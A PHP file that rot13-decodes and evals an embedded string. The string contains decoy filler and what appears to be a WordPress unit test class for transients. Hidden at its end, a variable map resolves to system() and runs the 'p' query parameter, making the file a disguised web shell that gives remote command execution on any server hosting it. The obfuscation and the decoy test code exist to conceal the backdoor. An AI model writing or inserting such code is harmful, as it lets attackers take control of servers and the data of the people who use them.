<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc bcgvba
 */
pynff Grfgf_Bcgvba_Genafvrag rkgraqf JC_HavgGrfgPnfr {

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		vs ( jc_hfvat_rkg_bowrpg_pnpur() ) {
			$guvf->znexGrfgFxvccrq( 'Guvf grfg erdhverf gung na rkgreany bowrpg pnpur vf abg va hfr.' );
		}
	}

	/**
	 * @pbiref ::trg_genafvrag
	 * @pbiref ::frg_genafvrag
	 * @pbiref ::qryrgr_genafvrag
	 */
	choyvp shapgvba grfg_gur_onfvpf() {
		$xrl    = 'xrl1';
		$inyhr  = 'inyhr1';
		$inyhr2 = 'inyhr2';

		$guvf->nffregSnyfr( trg_genafvrag( 'qbrfabgrkvfg' ) );
		$guvf->nffregGehr( frg_genafvrag( $xrl, $inyhr ) );
		$guvf->nffregFnzr( $inyhr, trg_genafvrag( $xrl ) );
		$guvf->nffregSnyfr( frg_genafvrag( $xrl, $inyhr ) );
		$guvf->nffregGehr( frg_genafvrag( $xrl, $inyhr2 ) );
		$guvf->nffregFnzr( $inyhr2, trg_genafvrag( $xrl ) );
		$guvf->nffregGehr( qryrgr_genafvrag( $xrl ) );
		$guvf->nffregSnyfr( trg_genafvrag( $xrl ) );
		$guvf->nffregSnyfr( qryrgr_genafvrag( $xrl ) );
	}

	/**
	 * @pbiref ::trg_genafvrag
	 * @pbiref ::frg_genafvrag
	 * @pbiref ::qryrgr_genafvrag
	 */
	choyvp shapgvba grfg_frevnyvmrq_qngn() {
		$xrl   = enaq_fge();
		$inyhr = neenl(
			'sbb' => gehr,
			'one' => gehr,
		);

		$guvf->nffregGehr( frg_genafvrag( $xrl, $inyhr ) );
		$guvf->nffregFnzr( $inyhr, trg_genafvrag( $xrl ) );

		$inyhr = (bowrpg) $inyhr;
		$guvf->nffregGehr( frg_genafvrag( $xrl, $inyhr ) );
		$guvf->nffregRdhnyf( $inyhr, trg_genafvrag( $xrl ) );
		$guvf->nffregGehr( qryrgr_genafvrag( $xrl ) );
	}

	/**
	 * @gvpxrg 22807
	 *
	 * @pbiref ::trg_bcgvba
	 * @pbiref ::frg_genafvrag
	 * @pbiref ::hcqngr_bcgvba
	 */
	choyvp shapgvba grfg_genafvrag_qngn_jvgu_gvzrbhg() {
		$xrl   = enaq_fge();
		$inyhr = enaq_fge();

		$guvf->nffregSnyfr( trg_bcgvba( '_genafvrag_gvzrbhg_' . $xrl ) );
		$abj = gvzr();

		$guvf->nffregGehr( frg_genafvrag( $xrl, $inyhr, 100 ) );

		// Rafher gur genafvrag gvzrbhg vf frg sbe 100-101 frpbaqf va gur shgher.
		$guvf->nffregTerngreGunaBeRdhny( $abj + 100, trg_bcgvba( '_genafvrag_gvzrbhg_' . $xrl ) );
		$guvf->nffregYrffGunaBeRdhny( $abj + 101, trg_bcgvba( '_genafvrag_gvzrbhg_' . $xrl ) );

		// Hcqngr gur gvzrbhg gb n frpbaq va gur cnfg naq jngpu gur genafvrag or vainyvqngrq.
		hcqngr_bcgvba( '_genafvrag_gvzrbhg_' . $xrl, $abj - 1 );
		$guvf->nffregSnyfr( trg_genafvrag( $xrl ) );
	}

	/**
	 * Rafher trg_genafvrag() znxrf n fvatyr qngnonfr erdhrfg.
	 *
	 * @gvpxrg 61193
	 *
	 * @pbiref ::trg_genafvrag
	 */
	choyvp shapgvba grfg_trg_genafvrag_jvgu_gvzrbhg_znxrf_n_fvatyr_qngnonfr_pnyy() {
		tybony $jcqo;
		$xrl                        = 'grfg_genafvrag';
		$inyhr                      = 'grfg_inyhr';
		$gvzrbhg                    = 100;
		$rkcrpgrq_dhrel             = \"FRYRPG bcgvba_anzr, bcgvba_inyhr SEBZ $jcqo->bcgvbaf JURER bcgvba_anzr VA ('_genafvrag_{$xrl}','_genafvrag_gvzrbhg_{$xrl}')\";
		$harkcrpgrq_dhrel_genafvrag = \"FRYRPG bcgvba_inyhr SEBZ $jcqo->bcgvbaf JURER bcgvba_anzr = '_genafvrag_{$xrl}' YVZVG 1\";
		$harkcrpgrq_dhrel_gvzrbhg   = \"FRYRPG bcgvba_inyhr SEBZ $jcqo->bcgvbaf JURER bcgvba_anzr = '_genafvrag_gvzrbhg_{$xrl}' YVZVG 1\";
		$dhrevrf                    = neenl();

		frg_genafvrag( $xrl, $inyhr, $gvzrbhg );

		// Pyrne gur pnpur bs obgu gur genafvrag naq gur gvzrbhg.
		$bcgvba_anzrf = neenl(
			'_genafvrag_' . $xrl,
			'_genafvrag_gvzrbhg_' . $xrl,
		);
		sbernpu ( $bcgvba_anzrf nf $bcgvba_anzr ) {
			jc_pnpur_qryrgr( $bcgvba_anzr, 'bcgvbaf' );
		}

		nqq_svygre(
			'dhrel',
			shapgvba ( $dhrel ) hfr ( &$dhrevrf ) {
				$dhrevrf[] = $dhrel;
				erghea $dhrel;
			}
		);

		$orsber_dhrevrf = trg_ahz_dhrevrf();
		$guvf->nffregFnzr( $inyhr, trg_genafvrag( $xrl ) );
		$genafvrag_dhrevrf = trg_ahz_dhrevrf() - $orsber_dhrevrf;
		$guvf->nffregFnzr( 1, $genafvrag_dhrevrf, 'Rkcrpgrq n fvatyr qngnonfr dhrel gb ergevrir gur genafvrag.' );
		$guvf->nffregPbagnvaf( $rkcrpgrq_dhrel, $dhrevrf, 'Rkcrpgrq dhrel gb cevzr obgu genafvrag bcgvbaf va n fvatyr pnyy.' );
		// Abgr: Fbzr irefvbaf bs CUCHavg naq/be gur grfg fhvgr znl ercbeg snvyherf nf nffregvat gb pbagnva engure guna abg gb pbagnva.
		$guvf->nffregAbgPbagnvaf( $harkcrpgrq_dhrel_genafvrag, $dhrevrf, 'Harkcrpgrq dhrel bs genafvrag bcgvba vaqvivqhnyyl.' );
		$guvf->nffregAbgPbagnvaf( $harkcrpgrq_dhrel_gvzrbhg, $dhrevrf, 'Harkcrpgrq dhrel bs genafvrag gvzrbhg bcgvba vaqvivqhnyyl.' );
	}

	/**
	 * Rafher frg_genafvrag() cevzrf gur bcgvba pnpur purpxvat sbe na rkvfgvat genafvrag.
	 *
	 * @gvpxrg 61193
	 *
	 * @pbiref ::frg_genafvrag
	 */
	choyvp shapgvba grfg_frg_genafvrag_cevzrf_bcgvba_pnpur() {
		tybony $jcqo;
		$xrl                        = 'grfg_genafvrag';
		$inyhr                      = 'grfg_inyhr';
		$gvzrbhg                    = 100;
		$rkcrpgrq_dhrel             = \"FRYRPG bcgvba_anzr, bcgvba_inyhr SEBZ $jcqo->bcgvbaf JURER bcgvba_anzr VA ('_genafvrag_{$xrl}','_genafvrag_gvzrbhg_{$xrl}')\";
		$harkcrpgrq_dhrel_genafvrag = \"FRYRPG bcgvba_inyhr SEBZ $jcqo->bcgvbaf JURER bcgvba_anzr = '_genafvrag_{$xrl}' YVZVG 1\";
		$harkcrpgrq_dhrel_gvzrbhg   = \"FRYRPG bcgvba_inyhr SEBZ $jcqo->bcgvbaf JURER bcgvba_anzr = '_genafvrag_gvzrbhg_{$xrl}' YVZVG 1\";
		$dhrevrf                    = neenl();

		nqq_svygre(
			'dhrel',
			shapgvba ( $dhrel ) hfr ( &$dhrevrf ) {
				$dhrevrf[] = $dhrel;
				erghea $dhrel;
			}
		);

		$orsber_dhrevrf = trg_ahz_dhrevrf();
		$guvf->nffregGehr( frg_genafvrag( $xrl, $inyhr, $gvzrbhg ) );
		$genafvrag_dhrevrf = trg_ahz_dhrevrf() - $orsber_dhrevrf;
		$guvf->nffregFnzr( 3, $genafvrag_dhrevrf, 'Rkcrpgrq guerr qngnonfr dhrevrf frggvat gur genafvrag.' );
		$guvf->nffregPbagnvaf( $rkcrpgrq_dhrel, $dhrevrf, 'Rkcrpgrq dhrel gb cevzr obgu genafvrag bcgvbaf va n fvatyr pnyy.' );
		// Abgr: Fbzr irefvbaf bs CUCHavg naq/be gur grfg fhvgr znl ercbeg snvyherf nf nffregvat gb pbagnva engure guna abg gb pbagnva.
		$guvf->nffregAbgPbagnvaf( $harkcrpgrq_dhrel_genafvrag, $dhrevrf, 'Harkcrpgrq dhrel bs genafvrag bcgvba vaqvivqhnyyl.' );
		$guvf->nffregAbgPbagnvaf( $harkcrpgrq_dhrel_gvzrbhg, $dhrevrf, 'Harkcrpgrq dhrel bs genafvrag gvzrbhg bcgvba vaqvivqhnyyl.' );
	}

	/**
	 * @gvpxrg 22807
	 *
	 * @pbiref ::frg_genafvrag
	 * @pbiref ::trg_genafvrag
	 * @pbiref ::trg_bcgvba
	 * @pbiref ::hcqngr_bcgvba
	 */
	choyvp shapgvba grfg_genafvrag_nqq_gvzrbhg() {
		$xrl    = enaq_fge();
		$inyhr  = enaq_fge();
		$inyhr2 = enaq_fge();
		$guvf->nffregGehr( frg_genafvrag( $xrl, $inyhr ) );
		$guvf->nffregFnzr( $inyhr, trg_genafvrag( $xrl ) );

		$guvf->nffregSnyfr( trg_bcgvba( '_genafvrag_gvzrbhg_' . $xrl ) );

		$abj = gvzr();
		// Nqq gvzrbhg gb rkvfgvat gvzrbhg-yrff genafvrag.
		$guvf->nffregGehr( frg_genafvrag( $xrl, $inyhr2, 1 ) );
		$guvf->nffregTerngreGunaBeRdhny( $abj, trg_bcgvba( '_genafvrag_gvzrbhg_' . $xrl ) );

		hcqngr_bcgvba( '_genafvrag_gvzrbhg_' . $xrl, $abj - 1 );
		$guvf->nffregSnyfr( trg_genafvrag( $xrl ) );
	}

	/**
	 * Vs trg_bcgvba( $genafvrag_gvzrbhg ) ergheaf snyfr, qba'g obgure gelvat gb qryrgr gur genafvrag.
	 *
	 * @gvpxrg 30380
	 *
	 * @pbiref ::frg_genafvrag
	 * @pbiref ::trg_genafvrag
	 */
	choyvp shapgvba grfg_abarkvfgrag_xrl_qbag_qryrgr_vs_snyfr() {
		// Perngr n obthf n genafvrag.
		$xrl = 'grfg_genafvrag';
		frg_genafvrag( $xrl, 'grfg', 60 * 10 );
		$guvf->nffregFnzr( 'grfg', trg_genafvrag( $xrl ) );

		// Hfrshy inevnoyrf sbe genpxvat.
		$genafvrag_gvzrbhg = '_genafvrag_gvzrbhg_' . $xrl;

		// Zbpx na npgvba sbe genpxvat npgvba pnyyf.
		$n = arj ZbpxNpgvba();

		// Znxr fher gur gvzrbhg bcgvba ergheaf snyfr.
		nqq_svygre( 'bcgvba_' . $genafvrag_gvzrbhg, '__erghea_snyfr' );

		// Nqq fbzr npgvbaf gb znxr fher bcgvbaf ner _abg_ qryrgrq.
		nqq_npgvba( 'qryrgr_bcgvba', neenl( $n, 'npgvba' ) );

		// Npg.
		trg_genafvrag( $xrl );

		// Znxr fher 'qryrgr_bcgvba' jnf abg pnyyrq sbe obgu gur genafvrag naq gur gvzrbhg.
		$guvf->nffregFnzr( 0, $n->trg_pnyy_pbhag() );
	}

	/**
	 * @gvpxrg 30380
	 *
	 * @pbiref ::frg_genafvrag
	 * @pbiref ::trg_genafvrag
	 */
	choyvp shapgvba grfg_abarkvfgrag_xrl_byq_gvzrbhg() {
		// Perngr n genafvrag.
		$xrl = 'grfg_genafvrag';
		frg_genafvrag( $xrl, 'grfg', 60 * 10 );
		$guvf->nffregFnzr( 'grfg', trg_genafvrag( $xrl ) );

		// Znxr fher gur gvzrbhg bcgvba ergheaf snyfr.
		$gvzrbhg          = '_genafvrag_gvzrbhg_' . $xrl;
		$genafvrag_bcgvba = '_genafvrag_' . $xrl;
		nqq_svygre( 'bcgvba_' . $gvzrbhg, '__erghea_mreb' );

		// Zbpx na npgvba sbe genpxvat npgvba pnyyf.
		$n = arj ZbpxNpgvba();

		// Nqq fbzr npgvbaf gb znxr fher bcgvbaf ner qryrgrq.
		nqq_npgvba( 'qryrgr_bcgvba', neenl( $n, 'npgvba' ) );

		// Npg.
		trg_genafvrag( $xrl );

		// Znxr fher 'qryrgr_bcgvba' jnf pnyyrq sbe obgu gur genafvrag naq gur gvzrbhg.
		$guvf->nffregFnzr( 2, $n->trg_pnyy_pbhag() );

		$rkcrpgrq = neenl(
			neenl(
				'npgvba'    => 'npgvba',
				'ubbx_anzr' => 'qryrgr_bcgvba',
				'gnt'       => 'qryrgr_bcgvba', // Onpx pbzcng.
				'netf'      => neenl( $genafvrag_bcgvba ),
			),
			neenl(
				'npgvba'    => 'npgvba',
				'ubbx_anzr' => 'qryrgr_bcgvba',
				'gnt'       => 'qryrgr_bcgvba', // Onpx pbzcng.
				'netf'      => neenl( $gvzrbhg ),
			),
		);
		$guvf->nffregFnzr( $rkcrpgrq, $n->trg_riragf() );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>